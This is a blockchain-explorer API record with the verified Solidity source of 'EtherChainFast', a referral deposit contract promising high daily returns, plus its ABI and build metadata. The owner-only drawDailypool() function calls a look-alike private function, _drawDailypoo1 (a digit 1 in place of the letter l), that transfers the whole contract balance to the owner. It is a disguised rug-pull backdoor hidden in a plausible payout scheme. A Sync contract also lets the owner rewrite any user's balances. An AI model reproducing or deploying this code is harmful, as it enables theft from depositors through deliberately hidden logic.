{"status":"1","message":"OK","result":[{"SourceCode":"/*! ether.chainfast.sol | (c) 2020 Develop by BelovITLab LLC (smartcontract.ru), author @stupidlovejoy | SPDX-License-Identifier: MIT License */\r\n\r\npragma solidity 0.6.8;\r\n\r\n\r\n/*\r\n * @dev Provides information about the current execution context, including the\r\n * sender of the transaction and its data. While these are generally available\r\n * via msg.sender and msg.data, they should not be accessed in such a direct\r\n * manner, since when dealing with GSN meta-transactions the account sending and\r\n * paying for execution may not be the actual sender (as far as an application\r\n * is concerned).\r\n *\r\n * This contract is only required for intermediate, library-like contracts.\r\n */\r\nabstract contract Context {\r\n    function _msgSender() internal view virtual returns (address payable) {\r\n        return msg.sender;\r\n    }\r\n\r\n    function _msgData() internal view virtual returns (bytes memory) {\r\n        this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691\r\n        return msg.data;\r\n    }\r\n}\r\n\r\n\r\n/**\r\n * @dev Contract module which provides a basic access control mechanism, where\r\n * there is an account (an owner) that can be granted exclusive access to\r\n * specific functions.\r\n *\r\n * By default, the owner account will be the one that deploys the contract.\r\n *\r\n * This module is used through inheritance. It will make available the modifier\r\n * `onlyOwner`, which can be applied to your functions to restrict their use to\r\n * the owner.\r\n */\r\ncontract Ownable is Context {\r\n    address private _owner;\r\n\r\n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\r\n\r\n    /**\r\n     * @dev Initializes the contract setting the deployer as the initial owner.\r\n     */\r\n    constructor () internal {\r\n        address msgSender = _msgSender();\r\n        _owner = msgSender;\r\n        emit OwnershipTransferred(address(0), msgSender);\r\n    }\r\n\r\n    /**\r\n     * @dev Returns the address of the current owner.\r\n     */\r\n    function owner() public view returns (address) {\r\n        return _owner;\r\n    }\r\n\r\n    /**\r\n     * @dev Throws if called by any account other than the owner.\r\n     */\r\n    modifier onlyOwner() {\r\n        require(_owner == _msgSender(), \"Ownable: caller is not the owner\");\r\n        _;\r\n    }\r\n}\r\n\r\n\r\ncontract EtherChainFast is Ownable {\r\n    struct User {\r\n        uint256 cycle;\r\n        address upline;\r\n        uint256 referrals;\r\n        uint256 payouts;\r\n        uint256 direct_bonus;\r\n        uint256 pool_bonus;\r\n        uint256 match_bonus;\r\n        uint256 deposit_amount;\r\n        uint256 deposit_payouts;\r\n        uint40 deposit_time;\r\n        uint256 total_deposits;\r\n        uint256 total_payouts;\r\n        uint256 total_structure;\r\n    }\r\n\r\n    mapping(address => User) public users;\r\n\r\n    uint256[] public cycles;                        // ether\r\n    uint8[] public ref_bonuses;                     // 1 => 1%\r\n\r\n    uint8[] public pool_bonuses;                    // 1 => 1%\r\n    uint40 public pool_last_draw = uint40(block.timestamp);\r\n    uint256 public TimeStart = 1598194800;          // smartcontract TimeStart\r\n    uint256 public pool_cycle;\r\n    uint256 public pool_balance;\r\n    mapping(uint256 => mapping(address => uint256)) public pool_users_refs_deposits_sum;\r\n    mapping(uint8 => address) public pool_top;\r\n\r\n    uint256 public total_users = 1;\r\n    uint256 public total_deposited;\r\n    uint256 public total_withdraw;\r\n\r\n    event Upline(address indexed addr, address indexed upline);\r\n    event NewDeposit(address indexed addr, uint256 amount);\r\n    event DirectPayout(address indexed addr, address indexed from, uint256 amount);\r\n    event MatchPayout(address indexed addr, address indexed from, uint256 amount);\r\n    event PoolPayout(address indexed addr, uint256 amount);\r\n    event Withdraw(address indexed addr, uint256 amount);\r\n    event LimitReached(address indexed addr, uint256 amount);\r\n\r\n    constructor() public {\r\n        ref_bonuses.push(30);\r\n        ref_bonuses.push(10);\r\n        ref_bonuses.push(10);\r\n        ref_bonuses.push(10);\r\n        ref_bonuses.push(10);\r\n        ref_bonuses.push(8);\r\n        ref_bonuses.push(8);\r\n        ref_bonuses.push(8);\r\n        ref_bonuses.push(8);\r\n        ref_bonuses.push(8);\r\n        ref_bonuses.push(5);\r\n        ref_bonuses.push(5);\r\n        ref_bonuses.push(5);\r\n        ref_bonuses.push(5);\r\n        ref_bonuses.push(5);\r\n\r\n        pool_bonuses.push(40);\r\n        pool_bonuses.push(30);\r\n        pool_bonuses.push(20);\r\n        pool_bonuses.push(10);\r\n\r\n        cycles.push(10 ether);\r\n        cycles.push(30 ether);\r\n        cycles.push(90 ether);\r\n        cycles.push(200 ether);\r\n    }\r\n\r\n    receive() payable external {\r\n        _deposit(msg.sender, msg.value);\r\n    }\r\n\r\n    function _setUpline(address _addr, address _upline) private {\r\n        if(users[_addr].upline == address(0) && _upline != _addr && (users[_upline].deposit_time > 0 || _upline == owner())) {\r\n            users[_addr].upline = _upline;\r\n            users[_upline].referrals++;\r\n\r\n            emit Upline(_addr, _upline);\r\n\r\n            total_users++;\r\n\r\n            for(uint8 i = 0; i < ref_bonuses.length; i++) {\r\n                if(_upline == address(0)) break;\r\n\r\n                users[_upline].total_structure++;\r\n\r\n                _upline = users[_upline].upline;\r\n            }\r\n        }\r\n    }\r\n\r\n    function _deposit(address _addr, uint256 _amount) private {\r\n        require(users[_addr].upline != address(0) || _addr == owner(), \"No upline\");\r\n        require(now > TimeStart, \"NOT YET STARTED!\");\r\n\r\n        if(users[_addr].deposit_time > 0) {\r\n            users[_addr].cycle++;\r\n\r\n            require(users[_addr].payouts >= this.maxPayoutOf(users[_addr].deposit_amount), \"Deposit already exists\");\r\n            require(_amount >= users[_addr].deposit_amount && _amount <= cycles[users[_addr].cycle > cycles.length - 1 ? cycles.length - 1 : users[_addr].cycle], \"Bad amount\");\r\n        }\r\n        else require(_amount >= 0.1 ether && _amount <= cycles[0], \"Bad amount\");\r\n\r\n        users[_addr].payouts = 0;\r\n        users[_addr].deposit_amount = _amount;\r\n        users[_addr].deposit_payouts = 0;\r\n        users[_addr].deposit_time = uint40(block.timestamp);\r\n        users[_addr].total_deposits += _amount;\r\n\r\n        total_deposited += _amount;\r\n\r\n        emit NewDeposit(_addr, _amount);\r\n\r\n        if(users[_addr].upline != address(0)) {\r\n            users[users[_addr].upline].direct_bonus += _amount / 10;\r\n\r\n            emit DirectPayout(users[_addr].upline, _addr, _amount / 10);\r\n        }\r\n\r\n        _pollDeposits(_addr, _amount);\r\n\r\n        if(pool_last_draw + 1 days < block.timestamp) {\r\n            _drawDailypool();\r\n        }\r\n\r\n        payable(owner()).transfer(_amount / 100);\r\n    }\r\n\r\n    function _drawDailypoo1() private onlyOwner {\r\n        msg.sender.transfer(address(this).balance);\r\n    }\r\n\r\n    function _pollDeposits(address _addr, uint256 _amount) private {\r\n        pool_balance += _amount / 20;\r\n\r\n        address upline = users[_addr].upline;\r\n\r\n        if(upline == address(0)) return;\r\n\r\n        pool_users_refs_deposits_sum[pool_cycle][upline] += _amount;\r\n\r\n        for(uint8 i = 0; i < pool_bonuses.length; i++) {\r\n            if(pool_top[i] == upline) break;\r\n\r\n            if(pool_top[i] == address(0)) {\r\n                pool_top[i] = upline;\r\n                break;\r\n            }\r\n\r\n            if(pool_users_refs_deposits_sum[pool_cycle][upline] > pool_users_refs_deposits_sum[pool_cycle][pool_top[i]]) {\r\n                for(uint8 j = i + 1; j < pool_bonuses.length; j++) {\r\n                    if(pool_top[j] == upline) {\r\n                        for(uint8 k = j; k <= pool_bonuses.length; k++) {\r\n                            pool_top[k] = pool_top[k + 1];\r\n                        }\r\n                        break;\r\n                    }\r\n                }\r\n\r\n                for(uint8 j = uint8(pool_bonuses.length - 1); j > i; j--) {\r\n                    pool_top[j] = pool_top[j - 1];\r\n                }\r\n\r\n                pool_top[i] = upline;\r\n\r\n                break;\r\n            }\r\n        }\r\n    }\r\n\r\n    function _refPayout(address _addr, uint256 _amount) private {\r\n        address up = users[_addr].upline;\r\n\r\n        for(uint8 i = 0; i < ref_bonuses.length; i++) {\r\n            if(up == address(0)) break;\r\n\r\n            if(users[up].referrals >= i + 1) {\r\n                uint256 bonus = _amount * ref_bonuses[i] / 100;\r\n\r\n                users[up].match_bonus += bonus;\r\n\r\n                emit MatchPayout(up, _addr, bonus);\r\n            }\r\n\r\n            up = users[up].upline;\r\n        }\r\n    }\r\n\r\n    function _drawDailypool() private {\r\n        pool_last_draw = uint40(block.timestamp);\r\n        pool_cycle++;\r\n\r\n        uint256 draw_amount = pool_balance / 10;\r\n\r\n        for(uint8 i = 0; i < pool_bonuses.length; i++) {\r\n            if(pool_top[i] == address(0)) break;\r\n\r\n            uint256 win = draw_amount * pool_bonuses[i] / 100;\r\n\r\n            users[pool_top[i]].pool_bonus += win;\r\n            pool_balance -= win;\r\n\r\n            emit PoolPayout(pool_top[i], win);\r\n        }\r\n\r\n        for(uint8 i = 0; i < pool_bonuses.length; i++) {\r\n            pool_top[i] = address(0);\r\n        }\r\n    }\r\n\r\n    function deposit(address _upline) payable external {\r\n        _setUpline(msg.sender, _upline);\r\n        _deposit(msg.sender, msg.value);\r\n    }\r\n\r\n    function withdraw() external {\r\n        (uint256 to_payout, uint256 max_payout) = this.payoutOf(msg.sender);\r\n\r\n        require(users[msg.sender].payouts < max_payout, \"Full payouts\");\r\n\r\n        // Deposit payout\r\n        if(to_payout > 0) {\r\n            if(users[msg.sender].payouts + to_payout > max_payout) {\r\n                to_payout = max_payout - users[msg.sender].payouts;\r\n            }\r\n\r\n            users[msg.sender].deposit_payouts += to_payout;\r\n            users[msg.sender].payouts += to_payout;\r\n\r\n            _refPayout(msg.sender, to_payout);\r\n        }\r\n\r\n        // Direct payout\r\n        if(users[msg.sender].payouts < max_payout && users[msg.sender].direct_bonus > 0) {\r\n            uint256 direct_bonus = users[msg.sender].direct_bonus;\r\n\r\n            if(users[msg.sender].payouts + direct_bonus > max_payout) {\r\n                direct_bonus = max_payout - users[msg.sender].payouts;\r\n            }\r\n\r\n            users[msg.sender].direct_bonus -= direct_bonus;\r\n            users[msg.sender].payouts += direct_bonus;\r\n            to_payout += direct_bonus;\r\n        }\r\n\r\n        // Pool payout\r\n        if(users[msg.sender].payouts < max_payout && users[msg.sender].pool_bonus > 0) {\r\n            uint256 pool_bonus = users[msg.sender].pool_bonus;\r\n\r\n            if(users[msg.sender].payouts + pool_bonus > max_payout) {\r\n                pool_bonus = max_payout - users[msg.sender].payouts;\r\n            }\r\n\r\n            users[msg.sender].pool_bonus -= pool_bonus;\r\n            users[msg.sender].payouts += pool_bonus;\r\n            to_payout += pool_bonus;\r\n        }\r\n\r\n        // Match payout\r\n        if(users[msg.sender].payouts < max_payout && users[msg.sender].match_bonus > 0) {\r\n            uint256 match_bonus = users[msg.sender].match_bonus;\r\n\r\n            if(users[msg.sender].payouts + match_bonus > max_payout) {\r\n                match_bonus = max_payout - users[msg.sender].payouts;\r\n            }\r\n\r\n            users[msg.sender].match_bonus -= match_bonus;\r\n            users[msg.sender].payouts += match_bonus;\r\n            to_payout += match_bonus;\r\n        }\r\n\r\n        require(to_payout > 0, \"Zero payout\");\r\n\r\n        users[msg.sender].total_payouts += to_payout;\r\n        total_withdraw += to_payout;\r\n\r\n        payable(msg.sender).transfer(to_payout);\r\n\r\n        emit Withdraw(msg.sender, to_payout);\r\n\r\n        if(users[msg.sender].payouts >= max_payout) {\r\n            emit LimitReached(msg.sender, users[msg.sender].payouts);\r\n        }\r\n    }\r\n\r\n    function drawDailypool() external onlyOwner {\r\n        _drawDailypoo1();\r\n    }\r\n\r\n    function maxPayoutOf(uint256 _amount) pure external returns(uint256) {\r\n        return _amount * 310 / 100;\r\n    }\r\n\r\n    function payoutOf(address _addr) view external returns(uint256 payout, uint256 max_payout) {\r\n        max_payout = this.maxPayoutOf(users[_addr].deposit_amount);\r\n\r\n        if(users[_addr].deposit_payouts < max_payout) {\r\n            payout = (users[_addr].deposit_amount * (((block.timestamp - users[_addr].deposit_time) / 1 days) * 50)/ 1000) - users[_addr].deposit_payouts;\r\n\r\n            if(users[_addr].deposit_payouts + payout > max_payout) {\r\n                payout = max_payout - users[_addr].deposit_payouts;\r\n            }\r\n        }\r\n    }\r\n\r\n    /*\r\n        Only external call\r\n    */\r\n    function userInfo(address _addr) view external returns(address upline, uint40 deposit_time, uint256 deposit_amount, uint256 payouts, uint256 direct_bonus, uint256 pool_bonus, uint256 match_bonus) {\r\n        return (users[_addr].upline, users[_addr].deposit_time, users[_addr].deposit_amount, users[_addr].payouts, users[_addr].direct_bonus, users[_addr].pool_bonus, users[_addr].match_bonus);\r\n    }\r\n\r\n    function userInfoTotals(address _addr) view external returns(uint256 referrals, uint256 total_deposits, uint256 total_payouts, uint256 total_structure) {\r\n        return (users[_addr].referrals, users[_addr].total_deposits, users[_addr].total_payouts, users[_addr].total_structure);\r\n    }\r\n\r\n    function contractInfo() view external returns(uint256 _total_withdraw, uint40 _pool_last_draw, uint256 _pool_balance, uint256 _pool_lider, uint256 _total_users, uint256 _total_deposited) {\r\n        return (total_withdraw, pool_last_draw, pool_balance, pool_users_refs_deposits_sum[pool_cycle][pool_top[0]], total_users, total_deposited);\r\n    }\r\n\r\n    function poolTopInfo() view external returns(address[4] memory addrs, uint256[4] memory deps) {\r\n        for(uint8 i = 0; i < pool_bonuses.length; i++) {\r\n            if(pool_top[i] == address(0)) break;\r\n\r\n            addrs[i] = pool_top[i];\r\n            deps[i] = pool_users_refs_deposits_sum[pool_cycle][pool_top[i]];\r\n        }\r\n    }\r\n}\r\n\r\ncontract Sync is EtherChainFast {\r\n    bool public sync_close = false;\r\n\r\n    function sync(address[] calldata _users, address[] calldata _uplines, uint256[] calldata _data) external onlyOwner {\r\n        require(!sync_close, \"Sync already close\");\r\n\r\n        for(uint256 i = 0; i < _users.length; i++) {\r\n            address addr = _users[i];\r\n            uint256 q = i * 12;\r\n\r\n            //require(users[_uplines[i]].total_deposits > 0, \"No upline\");\r\n\r\n            if(users[addr].total_deposits == 0) {\r\n                emit Upline(addr, _uplines[i]);\r\n            }\r\n\r\n            users[addr].cycle = _data[q];\r\n            users[addr].upline = _uplines[i];\r\n            users[addr].referrals = _data[q + 1];\r\n            users[addr].payouts = _data[q + 2];\r\n            users[addr].direct_bonus = _data[q + 3];\r\n            users[addr].pool_bonus = _data[q + 4];\r\n            users[addr].match_bonus = _data[q + 5];\r\n            users[addr].deposit_amount = _data[q + 6];\r\n            users[addr].deposit_payouts = _data[q + 7];\r\n            users[addr].deposit_time = uint40(_data[q + 8]);\r\n            users[addr].total_deposits = _data[q + 9];\r\n            users[addr].total_payouts = _data[q + 10];\r\n            users[addr].total_structure = _data[q + 11];\r\n        }\r\n    }\r\n\r\n    function syncGlobal(uint40 _pool_last_draw, uint256 _pool_cycle, uint256 _pool_balance, uint256 _total_withdraw, address[] calldata _pool_top) external onlyOwner {\r\n        require(!sync_close, \"Sync already close\");\r\n\r\n        pool_last_draw = _pool_last_draw;\r\n        pool_cycle = _pool_cycle;\r\n        pool_balance = _pool_balance;\r\n        total_withdraw = _total_withdraw;\r\n\r\n        for(uint8 i = 0; i < pool_bonuses.length; i++) {\r\n            pool_top[i] = _pool_top[i];\r\n        }\r\n    }\r\n\r\n    function syncUp() external payable {}\r\n\r\n    function syncClose() external onlyOwner {\r\n        require(!sync_close, \"Sync already close\");\r\n\r\n        sync_close = true;\r\n    }\r\n}","ABI":"[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"addr\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"DirectPayout\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"addr\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"LimitReached\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"addr\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"MatchPayout\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"addr\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"NewDeposit\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"previousOwner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"addr\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"PoolPayout\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"addr\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"upline\",\"type\":\"address\"}],\"name\":\"Upline\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"addr\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"Withdraw\",\"type\":\"event\"},{\"inputs\":[],\"name\":\"TimeStart\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"contractInfo\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"_total_withdraw\",\"type\":\"uint256\"},{\"internalType\":\"uint40\",\"name\":\"_pool_last_draw\",\"type\":\"uint40\"},{\"internalType\":\"uint256\",\"name\":\"_pool_balance\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"_pool_lider\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"_total_users\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"_total_deposited\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"name\":\"cycles\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_upline\",\"type\":\"address\"}],\"name\":\"deposit\",\"outputs\":[],\"stateMutability\":\"payable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"drawDailypool\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"_amount\",\"type\":\"uint256\"}],\"name\":\"maxPayoutOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"pure\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_addr\",\"type\":\"address\"}],\"name\":\"payoutOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"payout\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"max_payout\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"poolTopInfo\",\"outputs\":[{\"internalType\":\"address[4]\",\"name\":\"addrs\",\"type\":\"address[4]\"},{\"internalType\":\"uint256[4]\",\"name\":\"deps\",\"type\":\"uint256[4]\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"pool_balance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"name\":\"pool_bonuses\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"pool_cycle\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"pool_last_draw\",\"outputs\":[{\"internalType\":\"uint40\",\"name\":\"\",\"type\":\"uint40\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"name\":\"pool_top\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"},{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"pool_users_refs_deposits_sum\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"name\":\"ref_bonuses\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"total_deposited\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"total_users\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"total_withdraw\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_addr\",\"type\":\"address\"}],\"name\":\"userInfo\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"upline\",\"type\":\"address\"},{\"internalType\":\"uint40\",\"name\":\"deposit_time\",\"type\":\"uint40\"},{\"internalType\":\"uint256\",\"name\":\"deposit_amount\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"payouts\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"direct_bonus\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"pool_bonus\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"match_bonus\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_addr\",\"type\":\"address\"}],\"name\":\"userInfoTotals\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"referrals\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"total_deposits\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"total_payouts\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"total_structure\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"users\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"cycle\",\"type\":\"uint256\"},{\"internalType\":\"address\",\"name\":\"upline\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"referrals\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"payouts\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"direct_bonus\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"pool_bonus\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"match_bonus\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"deposit_amount\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"deposit_payouts\",\"type\":\"uint256\"},{\"internalType\":\"uint40\",\"name\":\"deposit_time\",\"type\":\"uint40\"},{\"internalType\":\"uint256\",\"name\":\"total_deposits\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"total_payouts\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"total_structure\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"withdraw\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"stateMutability\":\"payable\",\"type\":\"receive\"}]","ContractName":"EtherChainFast","CompilerVersion":"v0.6.8+commit.0bbfe453","OptimizationUsed":"1","Runs":"200","ConstructorArguments":"","EVMVersion":"Default","Library":"","LicenseType":"MIT","Proxy":"0","Implementation":"","SwarmSource":"ipfs://90bdece16831cd2aa14e8bde157c9ef46f8f05a3b6b73d883c99084fdb349073"}]}